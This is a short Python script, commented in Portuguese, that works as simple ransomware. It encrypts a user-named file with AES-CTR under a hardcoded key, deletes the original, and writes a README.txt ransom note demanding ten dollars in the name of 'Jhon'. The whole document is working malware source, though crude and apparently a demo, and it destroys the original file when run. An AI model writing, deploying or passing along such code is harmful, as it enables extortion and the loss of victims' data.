import pyaes
import os

# Solicitar o nome do arquivo para criptografia
file_name = input("Arquivo a criptografar: ")

if not os.path.exists(file_name):
    print("Arquivo não encontrado!")
    exit()

# Ler o arquivo
with open(file_name, 'rb') as file:
    file_data = file.read()

# Chave de 16 bytes
key = b"0ase9D3R1aV2eh3N"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar e salvar
with open(file_name + ".encrypted", "wb") as new_file:
    new_file.write(aes.encrypt(file_data))

os.remove(file_name)

# Criar aviso
with open("README.txt", "w") as text:
    text.write("Você foi infectado pelo Jhon. Pague 10 dólares e tenha seus arquivos recuperados.")

print("Arquivo criptografado!")
